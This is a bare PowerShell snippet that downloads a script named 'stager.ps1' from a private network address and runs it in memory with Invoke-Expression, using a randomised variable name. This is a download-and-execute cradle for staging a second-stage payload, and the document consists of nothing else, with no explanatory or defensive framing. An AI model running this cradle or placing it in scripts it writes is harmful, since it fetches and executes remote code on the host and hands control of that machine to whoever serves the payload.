
    $eumiygdp = New-Object System.Net.WebClient
    $url = "http://10.0.0.2/stager.ps1"
    IEX $eumiygdp.DownloadString($url)
    